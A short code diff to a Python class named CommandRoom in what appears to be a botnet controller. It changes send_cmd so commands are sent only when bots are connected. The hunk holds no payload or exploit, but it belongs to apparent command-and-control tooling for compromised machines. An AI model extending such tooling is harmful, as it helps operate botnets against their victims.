@@ -91,7 +91,9 @@ class CommandRoom:
         return self.room.leave()
 
     def send_cmd(self, cmd) -> bool:
-        return self.room.send_text(cmd)
+        if len(self.bots) > 0:
+            return self.room.send_text(cmd)
+        return True
         
 
 class BotnetController:
